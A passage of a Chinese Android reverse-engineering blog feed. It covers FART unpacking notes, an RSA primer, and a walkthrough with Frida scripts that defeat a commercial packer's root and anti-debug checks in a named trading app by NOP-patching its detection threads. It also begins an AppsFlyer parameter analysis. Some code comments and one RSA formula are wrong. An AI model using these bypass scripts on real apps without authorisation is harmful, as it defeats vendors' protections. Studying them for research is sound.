    <content><![CDATA[<p>这里是脱壳的一些碎碎念和FART脱壳机的使用流程</p>
<span id="more"></span>

<h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><ul>
<li>app解压看文件也能看出来是否加壳</li>
<li>用Android killer等工具也能查看：AndroidManifest.xml里面有入口包名，但是找不到这个文件可能是dex加壳了当然也可能是解析错误，一半都可以看到包名特征（这类工具还有：GDA、jadx。。。）</li>
<li>现在国内应用商城大部分应用都加壳了，除了一些大型应用和对效率要求比较高的应用，googleplay倒是没有强制要求加壳。苹果商店加的是苹果的壳，自动脱壳机就能脱。</li>
</ul>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><ul>
<li>逆向分析过程中的点：<ol>
<li>持之以恒的精神：更多的时候是死磕专业安全人员编写的代码。</li>
<li>耐心：因为分析的东西比较多包括混淆、加壳、so文件等等保护手段。尽量在每次分析过程中都有所提高，而不是去进行一些重复的工作。</li>
</ol>
</li>
<li>一些时候安全软件可能会把加壳的应用识别为木马</li>
<li>一些书籍：<ul>
<li>非虫《Android软件安全与逆向分析》（对逆向分析怎么做有一个大概的流程）</li>
<li>姜维《Android应用安全防护和逆向分析》（偏向应用方面，对加壳的手段为什么这么加壳有一定的了解，以及未来的发展前景有一定估计）</li>
<li>邓凡平《深入理解Android：Java虚拟机ART》（难度比较大：可以先看能看懂的地方。主要从源码的角度去看ART的实现，如果能看懂这本书，那么ART对于我们来说也就是一些C/C++代码了可以很轻松的进行定制来跟踪记录app的运行轨迹可以做自己的应用沙盒来辅助逆向分析可以事半功倍）</li>
</ul>
</li>
<li>一定要会正向开发才能做好逆向分析，比如什么是四大组件？app的运行流程？等等。。</li>
<li>攻防一体，只有先懂得了加壳原理才知道为什么别人这么脱壳，甚至是定制属于自己的脱壳手段，写一个类似于FART的脱壳工具</li>
<li>逆向分析的一般流程：<ol>
<li>使用自动化检测工具检测apk是否加壳，或者用反编译工具判断是否加壳</li>
<li>如果加壳，需要对apk进行脱壳</li>
<li>使用jeb、jadx、apktool等反编译工具对apk进行反编译</li>
<li>先依据静态分析中得到的关键字符串、关键api调用等方法快速定位需要分析的关键函数和流程</li>
<li>如果依据简单的字符串、关键api无法快速定位，这时候apk可能是用了字符串加密、反射调用等手段，此时可结合hook、动态调试等</li>
<li>定位到关键函数后，再根据是java实现还是jni实现进行一步步分析，如果是java实现的话往往根据静态的分析就能得出结果，如果是在so中的函数那么分析难度会较大一些。</li>
</ol>
</li>
</ul>
<h2 id="使用FART脱壳机进行脱壳"><a href="#使用FART脱壳机进行脱壳" class="headerlink" title="使用FART脱壳机进行脱壳"></a>使用FART脱壳机进行脱壳</h2><h3 id="制作脱壳机"><a href="#制作脱壳机" class="headerlink" title="制作脱壳机"></a>制作脱壳机</h3><ul>
<li><p>本次脱壳机设备：nexus5</p>
</li>
<li><p>制作脱壳机流程</p>
<ol>
<li><p>先进入bootloader</p>
<p><code>adb reboot bootloader</code></p>
</li>
<li><p>执行FART的对应设备型号的镜像刷入脱壳机</p>
<ul>
<li>执行镜像中的<strong>flash-all.bat</strong>文件</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="使用脱壳机"><a href="#使用脱壳机" class="headerlink" title="使用脱壳机"></a>使用脱壳机</h3><ul>
<li><p>直接安装apk，并执行就可以了</p>
<ul>
<li><p>需要注意的点</p>
<ol>
<li>是本次使用的脱壳机镜像需要在手机设置里面给app读写读写文件权限</li>
<li>测试的时候有个app没有文件读写的功能，所以没法给读写权限所以脱壳失败，因为没法写入到存储卡</li>
<li>这个版本的脱壳机将脱壳文件写在了**/sdcard/fart/**目录下</li>
</ol>
</li>
<li><p>如果权限正常执行apk后就会在**/sdcard/fart/**目录下生成脱壳后的文件</p>
<img src="/2023/08/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%92%8C%E8%84%B1%E5%A3%B3%E7%9A%84%E6%84%8F%E4%B9%89/image-20230819100828350.png" class="" title="image-20230819100828350"></li>
</ul>
</li>
<li><p>脱壳出来的dex的魔术头可能会被抹掉导致反编译工具不识别</p>
<ul>
<li>有这种情况就打开一个正常的dex文件，把它的前八个字节替换过来就好了</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android脱壳</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>非对称密码-RSA</title>
    <url>/2024/03/05/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-RSA/</url>
    <content><![CDATA[<p>本章内容主要为RSA密码的原理以及定位</p>
<p>分组密码在应用和协议的加解密中比较常用，非对称加密RSA因为加密效率的原因更多的用在密钥的分发方面</p>
<p>非对称密码中的RSA在当前互联网时代被广泛使用（网站、app、协议、桌面应用、服务器等等）。RSA加密算法是公钥密码体制中的一种，改算法基于数学理论而不是对称密码中的混淆和扩散。RSA密码算法当中加密和解密使用的是不同的密钥，因此被称为非对称密码。RSA是1977年由罗纳德·里维斯特、阿迪·萨莫尔和伦纳德·阿德曼一起提出的。RSA就是他们三人姓氏开头字母拼在一起的。</p>
<span id="more"></span>

<p>RSA原理来自数论相关知识。RSA公开密钥密码体制的原理是：根据数论，寻求两个大素数比较简单，而将它们的乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。</p>
<blockquote>
<p>找素数</p>
<ul>
<li>选取两个大的随机素数</li>
</ul>
<p>计算模n和Euler函数<strong>φ(n)</strong></p>
<ul>
<li>$n = pq$</li>
<li>$φ(n) = (p-1)(q-1)$</li>
</ul>
<p>找$ed ≡ 1 mod φ(n)$</p>
<ul>
<li>随机取一个数e（与φ(n)互素），用扩展Euclid算法求d即可</li>
</ul>
<p>发布</p>
<ul>
<li>d保密，（d，n）是私钥$K_s$</li>
<li>发布（e，n），这是公钥$K_p$</li>
<li>销毁p、q</li>
</ul>
<p>加密</p>
<p>​	$c = m^e ,mod ,n$</p>
<p>解密</p>
<p>​	$m = c^d,mod,n$</p>
<p>明文分组m为整数且必须小于n</p>
</blockquote>
<h6 id="消息发送的流程"><a href="#消息发送的流程" class="headerlink" title="消息发送的流程"></a>消息发送的流程</h6><img src="/2024/03/05/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-RSA/image-20240305110855142.png" class="" title="image-20240305110855142">

<blockquote>
<ol>
<li><p>随机选择两个不相等的质数p和q例如61和53</p>
</li>
<li><p>计算p和q的乘积n，$n = 61 ✖️ 53 = 3233$，3233写成二进制是110010100001，一共有12位，即这个密钥就是12位</p>
</li>
<li><p>计算n的欧拉函数$φ(n)$</p>
<p>根据公式：$φ(n) = (p-1)(q-1)$ 算出$φ(3233)$等于60✖️52，即3120</p>
</li>
<li><p>选择一个整数e，条件是$1 &lt; e &lt; φ(n)$，且e与φ(n)互质。在1到3120之间，随机选择了17（实际应用中，常常选择65537）</p>
</li>
<li><p>计算e对于φ(n)的模反元素d</p>
<p>所谓“模反元素”就是指有一个整数d，可以使得ed被φ(n)除的余数为1</p>
<p>​	$ed ≡ 1(mod,φ(n))$</p>
<p>​	等价于</p>
<p>​	$ed -1 = kφ(n)$</p>
<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解</p>
<p>​	$ex + φ(n)y = 1$</p>
<p>已知$e = 17$ $φ(n) = 3120$</p>
<p>​		$17x + 3120y = 1$</p>
<p>这个方程可以用“扩展欧几里得算法”求解，此处省略具体过程。总之，算出一组整数解为$(x, y) = (2753, -15)$，即$d = 2753$</p>
</li>
<li><p>将n和e封装成公钥，n和d封装成私钥</p>
<p>例如：n = 3233，e = 17， d = 2753，所以公钥就是（3233， 17），私钥就是（3233， 2753）。有了公钥和私钥，就能进行加密和解密了。</p>
</li>
</ol>
<p>下面具体过程可以参考<a href="https://blog.csdn.net/lu1196700392/article/details/102593536">这篇帖子</a></p>
</blockquote>
<h6 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h6><p>对极大整数做因式分解的难度决定了RSA算法的可靠性。到目前为止公开的被破解的最长RSA密钥是768位。实际应用中一般情况下用1024位，重要场合2048位还都是安全的。</p>
<h6 id="如何加密长信息"><a href="#如何加密长信息" class="headerlink" title="如何加密长信息"></a>如何加密长信息</h6><p>公钥（n，e）只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种“对称加密算法（例如：DES）”，用这种算法的密钥加密信息，再用RSA公钥加密DES密钥</p>
<p>因为RSA的加密效率原因，通常会采用第二种方式</p>
<h6 id="RSA中的填充"><a href="#RSA中的填充" class="headerlink" title="RSA中的填充"></a>RSA中的填充</h6><p>在之前的分组加密中，Padding只是用来填充数据到指定的长度，而RSA通常不会加密特别长的数据，因此没有分组模式的概念，对于RSA来说Padding是既有分组模式的概念又有随机数的概念。即RSA的Padding包含了将数据填充到RSA密钥位数的长度的方法，还有填充随机数到RSA原文的方法</p>
<p>RSA算法的本质就是大数运算</p>
<p>​	$m^e ≡ c(mod\ n)$</p>
<p>​	$c^d ≡ c(mod\ n)$</p>
<p>其中m是原文，c是密文。如果使用原始的RSA做加解密操作，则并不包含随机数，相同的密文会生成相同的明文。同时由于大部分情况下m相比n小很多，甚至$m^e$都比n要小，这时候很容易通过枚举倍数破解明文。因此RSA加解密算法很需要有效的Padding算法讲明文填充到足够长保证不容易被暴力破解，这也就是加入随机因子保证密文的随机性的一个原因。</p>
<h6 id="查看RSA密钥"><a href="#查看RSA密钥" class="headerlink" title="查看RSA密钥"></a>查看RSA密钥</h6><p>用openssl生成一个RSA的key来看一下</p>
<p>生成</p>
<p><code>openssl genrsa -out pv.key 1024</code></p>
<p>从私钥中获取p、q、n、e、d信息</p>
<img src="/2024/03/05/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-RSA/image-20240305162959247.png" class="" title="image-20240305162959247">

<h6 id="实现RSA"><a href="#实现RSA" class="headerlink" title="实现RSA"></a>实现RSA</h6><p>在C/C++中使用RSA：不得不提的OpenSSL</p>
<p>OpenSSL开源库中针对当前流行密码学领域相关算法都进行了实现，其中就包含有非对称密码中的RSA算法。对于开发人员来说，很难去自己实现一个兼顾鲁棒性和效率的RSA加解密代码，因此也就一般都直接使用OpenSSL开源库。Google创建了OpenSSL分支：BoringSSL，但Google不打算取代OpenSSL，使用BoringSSL的代码不能保证API或ABI的稳定性，他们会继续向OpenSSL递交bug修正，继续资助相关的开源基金会。</p>
<h6 id="hook和定位RSA"><a href="#hook和定位RSA" class="headerlink" title="hook和定位RSA"></a>hook和定位RSA</h6><p>对于Java层的RSA还是和之前DES、AES一样，都是调用cipher实现的，所以还是同样的hook方式</p>
<p>对于so层来说，它的实现基本都是直接使用openssl的公开库，直接调用的。因此对于它的识别只需要使用ida插件快速定位到openssl库就可以了</p>
<p>定位RSA算法主要有：识别常量表、控制流、重放、识别OpenSSL库的版本制作签名库几种方法。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>加密解密</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过某邦企业壳root、frida检测</title>
    <url>/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/</url>
    <content><![CDATA[<p>本文主要分析下某梆企业壳的frida反调试</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>设备：pixel 5（Android11已root）</p>
<p>app平台：Android</p>
<p>app版本：4.66.0</p>
<p>工具：</p>
<blockquote>
<p>抓包：Postern + Charles</p>
<p>LSPosed版本：1.9.2</p>
<p>Magisk版本：28.1</p>
</blockquote>
<h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250605232717197.png" class="" title="image-20250605232717197">

<ul>
<li>检测结果表明是梆梆的壳，并且有root、模拟器检测以及各种反调试检测</li>
</ul>
<h1 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h1><h2 id="绕过-root-检测"><a href="#绕过-root-检测" class="headerlink" title="绕过 root 检测"></a>绕过 root 检测</h2><img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606005803395.png" class="" title="image-20250606005803395">

<ul>
<li>对此我们采用隐藏 Magisk + <a href="https://magiskcn.com/shamiko-install.html">Shamiko</a>  的方式来绕过 root 检测</li>
</ul>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606010411720.png" class="" title="image-20250606010411720">

<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606010320680.png" class="" title="image-20250606010320680">

<ul>
<li>配置好之后再打开 app 就不会检测到设备已经被 root 了</li>
</ul>
<h2 id="绕过-frida"><a href="#绕过-frida" class="headerlink" title="绕过 frida"></a>绕过 frida</h2><p>在设备上运行frida-server的时候app会直接闪退</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606011342622.png" class="" title="image-20250606011342622">

<ul>
<li>我们只是在设备上运行了 frida-server 在没有执行脚本的情况下 app 就会闪退</li>
</ul>
<h3 id="端口检测"><a href="#端口检测" class="headerlink" title="端口检测"></a>端口检测</h3><p>那么，可能是对 frida-server 的默认监听端口 <strong>27042</strong> 有检测</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606011913621.png" class="" title="image-20250606011913621">

<ul>
<li>修改端口后，打开app就不会闪退了</li>
</ul>
<p>那接下来尝试执行一下 frida-hook 脚本是否能正常执行</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606012655774.png" class="" title="image-20250606012655774">

<ul>
<li>可以看到有针对 frida-agent 的检测</li>
</ul>
<h3 id="agent-检测"><a href="#agent-检测" class="headerlink" title="agent 检测"></a>agent 检测</h3><p>通过前面查壳的结果可知，梆梆的壳的检测点在 libDexHelper.so 中。</p>
<p>这里的退出的提示表明是进程中的某个线程杀死了我们的注入。</p>
<h4 id="hook-pthread-create"><a href="#hook-pthread-create" class="headerlink" title="hook pthread_create"></a>hook <code>pthread_create</code></h4><p>那么我们就先 hook <code>pthread_create</code> 试试看能不能定位检测函数的位置</p>
<blockquote>
<p>函数原型：</p>
<pre><code class="c">int pthread_create(pthread_t *thread,
                   const pthread_attr_t *attr,
                   void *(*start_routine)(void *),
                   void *arg);
</code></pre>
<ul>
<li><p><code>thread</code>: 返回创建的线程 ID。</p>
</li>
<li><p><code>attr</code>: 线程属性（可以为 NULL）。</p>
</li>
<li><p><code>start_routine</code>: 线程执行函数。</p>
</li>
<li><p><code>arg</code>: 传入线程函数的参数。</p>
</li>
</ul>
</blockquote>
<pre><code class="js">function hook_pthread_create(){
    var pthC_addr = Module.findExportByName("libc.so", "pthread_create");
    console.log("pthC_addr &gt;&gt; ", pthC_addr);

    Interceptor.attach(pthC_addr, {
        onEnter:function(args){
            console.log(args[2], Process.findModuleByAddress(args[2]).name);
        }, onLeave:function(retval){

        }
    });
}

hook_pthread_create();
</code></pre>
<ul>
<li><p>执行：</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606020127187.png" class="" title="image-20250606020127187">

<ul>
<li>这里我们的脚本还是被干掉了，那可能是对 <code>pthread_create</code> 这个方法进行了hook检测</li>
</ul>
</li>
</ul>
<p><code>pthread_create</code> 的调用流程</p>
<pre><code class="bash">pthread_create()
   ↓
分配线程控制块（TCB）、栈空间等
   ↓
设置调度策略/属性（可选）
   ↓
调用 clone()
   ↓
内核创建 task_struct（共享 mm、fs、files、sighand 等）
   ↓
新线程执行 start_routine(arg)
</code></pre>
<ul>
<li>那我们尝试调用更深一层的 <code>clone()</code>试试</li>
</ul>
<blockquote>
<p>函数原型：</p>
<pre><code class="c">int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, 
          ... /* pid_t *ptid, struct user_desc *tls, pid_t *ctid */ );
</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>fn</code></td>
<td>子进程/线程启动后要执行的函数指针，类型为 <code>int (*fn)(void *)</code></td>
</tr>
<tr>
<td><code>child_stack</code></td>
<td>指向为子线程分配的栈顶（栈向下增长）</td>
</tr>
<tr>
<td><code>flags</code></td>
<td>控制资源共享与行为的标志位（如 <code>CLONE_VM</code>, <code>CLONE_THREAD</code> 等）</td>
</tr>
<tr>
<td><code>arg</code></td>
<td>传给 <code>fn</code> 的参数，即 <code>fn(arg)</code></td>
</tr>
<tr>
<td>其余参数（可选）</td>
<td>只在某些 <code>flags</code> 开启时需要，比如 <code>CLONE_PARENT_SETTID</code>, <code>CLONE_CHILD_SETTID</code>，用于设置 <code>ptid</code>、<code>tls</code>、<code>ctid</code> 等</td>
</tr>
</tbody></table>
</blockquote>
<p>先试试看能不能找到<code>clone()</code>是在哪个模块中调用的，和它的调用位置</p>
<pre><code class="js">var clone = Module.findExportByName(null, 'clone');
Interceptor.attach(clone,{
    onEnter: function(args){
        // 获取线程函数地址
        var thread_func = args[0];
        // 获取线程函数所在的模块
        var module_name = Process.findModuleByAddress(thread_func);
        if(module_name){
            console.log("Thread function is located in module: " + module_name.name);
        }
        // 打印调用栈
        console.log("Backtrace: ");
        console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\n'));
    }, onLeave:function(retval){

    }
});
</code></pre>
<ul>
<li><p>执行：<code>frida -H 127.0.0.1:6688 -f com.bybit.app -l test.js </code></p>
<blockquote>
<p>执行结果：</p>
<pre><code class="bash">Spawned `com.bybit.app`. Resuming main thread!                          
[Remote::com.bybit.app ]-&gt; Thread function is located in module: libc.so
Backtrace: 
0x71546cd5d4 libc.so!pthread_create+0x24c
</code></pre>
<ul>
<li>根据打印的结果现在我们去 libc.so 中的<code>pthread_create+0x24c</code>处看看</li>
</ul>
<p>直接跳转过去 F5 查看伪代码</p>
<pre><code class="c++">__int64 __fastcall pthread_create(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
    ...

    *(_QWORD *)(v30 + 96) = a3;
    
    ...

    v32 = clone(__pthread_start, v18, 4001536LL, v30, v30 + 16, v22 + 8, v30 + 16);
}
</code></pre>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606025528774.png" class="" title="image-20250606025528774">

<ul>
<li>根据上述代码可知<ul>
<li><code>a3</code>： 对应 start_routine（线程回调函数）</li>
<li><code>*(_QWORD *)(v30 + 96) = a3 </code>： 保存 start_routine 到新线程的内部结构中</li>
</ul>
</li>
</ul>
</blockquote>
</li>
</ul>
<p>那接下来就获取一下 “线程控制块” 的位置</p>
<pre><code class="js">var clone = Module.findExportByName('libc.so', 'clone');
Interceptor.attach(clone, {
    onEnter: function(args) {
        // 只有当 args[3] 不为 NULL 时，才说明上层确实把 “线程控制块指针” 传进来了
        if(args[3] != 0){
            // 真正的用户线程函数地址
            var addr = args[3].add(96).readPointer()
            // 根据线程函数地址 addr，找它属于哪个模块
            var so_name = Process.findModuleByAddress(addr).name;
            // 获取该 so 在进程里的基址
            var so_base = Module.getBaseAddress(so_name);
            // 获取相对于 so_base 的偏移
            var offset = (addr - so_base);
            console.log("===============&gt;", so_name, addr,offset, offset.toString(16));
        }
    },
    onLeave: function(retval) {
 
    }
});
</code></pre>
<ul>
<li><p>执行结果：</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606031739164.png" class="" title="image-20250606031739164">

<ul>
<li>打印出了 libDexHelper.so 创建的几个线程的位置</li>
</ul>
</li>
</ul>
<p>把 libDexHelper.so 创建的几个线程都 nop 掉试试</p>
<pre><code class="js">function hook_dlopen(so_name) {
    // 参数 args[0] 就是即将要加载的 so 文件路径（C 字符串指针）
    Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"), {
        onEnter: function (args) {
            // args[0] 是一个指向 char* 的指针，指向要加载的 so 路径
            var pathptr = args[0];
            if (pathptr !== undefined &amp;&amp; pathptr != null) {
                // 读取这个路径对应的 C 字符串
                var path = ptr(pathptr).readCString();
                // 如果路径里包含了我们关心的 so 名称，就把 this.match 标记为 true
                if (path.indexOf(so_name) !== -1) {
                    this.match = true;
                }
            }
        },
        onLeave: function (retval) {
            // 当 android_dlopen_ext 返回时，如果 onEnter 已经标记了 match，就说明 libDexHelper.so 加载完毕
            if (this.match) {
                console.log(so_name + " 加载成功");

                // 找到 libDexHelper.so 在进程里实际映射的基址（Memory 仓库地址）
                var base = Module.findBaseAddress(so_name);
                if (base === null) {
                    console.error("！！加载成功，但未找到基址：", so_name);
                    return;
                }

                // 下面对之前打印出来的几个偏移（相对于基址）位置，逐个进行 NOP 补丁
                patch_func_nop(base.add(346132));
                patch_func_nop(base.add(332548));
                patch_func_nop(base.add(376884));
                patch_func_nop(base.add(378220));
                patch_func_nop(base.add(403656));
            }
        }
    });
}

function patch_func_nop(addr) {
    // Memory.patchCode 用来在指定地址范围内进行写入，并在写入结束后自动恢复页面权限
    // 这里长度写 8，表示我们要覆盖 8 个字节（ARM64 下两条指令分别占 4 字节）
    Memory.patchCode(addr, 8, function (code) {
        // ARM64 下的 NOP 指令编码：0x1F2003D5，但有时写成 0xE0 0x03 0x00 0xAA / 0xC0 0x03 0x5F 0xD6
        // 这里我们分两次写，分别覆盖两条指令：
        // 第一条：mov x0, x0 (等同于 nop) -&gt; 0xE00300AA
        code.writeByteArray([0xE0, 0x03, 0x00, 0xAA]);
        // 第二条：nop           -&gt; 0xC0035FD6
        code.writeByteArray([0xC0, 0x03, 0x5F, 0xD6]);

        console.log("patch code at " + addr);
    });
}

hook_dlopen("libDexHelper.so");
</code></pre>
<ul>
<li><p>执行结果：</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606033607430.png" class="" title="image-20250606033607430">

<ul>
<li>搞定，现在 app 就不会检测到 frida-agent 闪退了。</li>
</ul>
</li>
</ul>
<h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p>脱壳试了frida-dexdump、fart 8没脱掉，暂时搞不定</p>
<img src="/2025/06/05/%E7%BB%95%E8%BF%87%E6%9F%90%E9%82%A6%E4%BC%81%E4%B8%9A%E5%A3%B3root%E3%80%81frida%E6%A3%80%E6%B5%8B/image-20250606152002530.png" class="" title="image-20250606152002530">



<p>fart 8也是启动 app 就会闪退</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App逆向</tag>
        <tag>Frida反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>AppsFlyer sbid 参数逆向实战：从 Frida Hook 到算法模拟</title>
    <url>/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250607081658543.png" class="" title="image-20250607081658543">

<ul>
<li>拿真机用<strong>Shamiko</strong>过一下 root 检测</li>
</ul>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="直接通过搜索定位到生成-sbid-的位置。目标是-sbid的生成规则，以及如何模拟"><a href="#直接通过搜索定位到生成-sbid-的位置。目标是-sbid的生成规则，以及如何模拟" class="headerlink" title="直接通过搜索定位到生成 sbid 的位置。目标是 sbid的生成规则，以及如何模拟"></a>直接通过搜索定位到生成 <code>sbid</code> 的位置。目标是 <code>sbid</code>的生成规则，以及如何模拟</h2><img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611093750766.png" class="" title="image-20250611093750766">

<ul>
<li>在 AppsFlyer 中，sbid 是 “Source Bundle ID” 的缩写，表示广告收益事件来自哪个应用或渠道。例如，在 Google AdMob 或 Meta Audience Network 中展示广告后，SDK 会记录下广告收益信息，并将它与某个 sbid 关联起来。</li>
<li>通常情况下，这个值不会被直接传入，而是由 SDK 内部根据上下文动态生成。</li>
</ul>
<blockquote>
<p>生成规则分析：</p>
<ol>
<li><p><code>sbid</code> 生成规则分析</p>
<p><strong><code>sbid</code>本质上是一个简单的 XOR 加密过程。它使用时间戳作为密钥对字符串进行逐字符加密</strong></p>
</li>
<li><p>有两个关键参数</p>
<ol>
<li><p><strong>待加密的原始字符串：<code>String str = aFd1nSDK.AFAdRevenueData;</code></strong></p>
<ol>
<li>先通过 hook 看一下这个值是什么</li>
</ol>
<pre><code class="js">Java.perform(function(){
  const AFg1qSDK = Java.use("com.appsflyer.internal.AFg1qSDK");
  const JClass   = Java.use("java.lang.Class");

  // Hook getRevenue，每次调用前用反射读 AFAdRevenueData
  AFg1qSDK.getRevenue
    .overload("java.util.Map", "com.appsflyer.internal.AFd1nSDK")
    .implementation = function(map, sdkInstance) {
      try {
        // 1. 拿到 AFd1nSDK 的 Class 对象
        const sdkClass = JClass.forName("com.appsflyer.internal.AFd1nSDK");
        // 2. 找到字段并允许访问
        const field    = sdkClass.getDeclaredField("AFAdRevenueData");
        field.setAccessible(true);
        // 3. 取出字段值（java.lang.String）
        const rawData  = field.get(sdkInstance);
        console.log("[getRevenue] AFAdRevenueData (plain) =", rawData);
      } catch (e) {
        console.error("反射读取 AFAdRevenueData 失败:", e);
      }
      // 最后调用真正的 SDK 方法，保持逻辑不变
      return this.getRevenue(map, sdkInstance);
    };
});
</code></pre>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611111012781.png" class="" title="image-20250611111012781">

<ul>
<li>根据结果可知 <strong><code>AFAdRevenueData</code> 是一个8位的16进制字符串</strong>，每次重启都会改变。但是回到桌面重新进入并不会改变</li>
<li>说明这个值是动态生成的，但是在单次运行中它的值是固定的</li>
</ul>
</li>
<li><p>再看这个值是从哪来的</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611111844164.png" class="" title="image-20250611111844164">

<ul>
<li><p>在 jadx 反编译的结果中有一个注释，这里可以用作参考</p>
<blockquote>
<ol>
<li><p><code>r0 = r6.getRevenue("com.appsflyer.security.uuid");</code></p>
<p>尝试获取一个名为 <code>"com.appsflyer.security.uuid"</code> 的值</p>
</li>
<li><p><code>if (com.appsflyer.internal.AFc1sSDK.getMonetizationNetwork(r0) == false) goto L12;</code></p>
<p>检查这个值是否为空</p>
</li>
<li><p><code>r0 = com.appsflyer.internal.AFd1nSDK.getRevenue();</code></p>
<p>如果为空就随机生成一个</p>
<img src="/2025/06/11/AppsFlyer-sbid-%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E-Frida-Hook-%E5%88%B0%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/image-20250611112714889.png" class="" title="image-20250611112714889">

<p>从这里可以确认这个值是随机生成的字符串</p>
</li>
<li><p><code>r6.AFAdRevenueData = r0.substring(0, 8);</code></p>
<p>取前8位给 <code>AFAdRevenueData </code></p>
</li>
</ol>
</blockquote>
</li>
</ul>
</li>
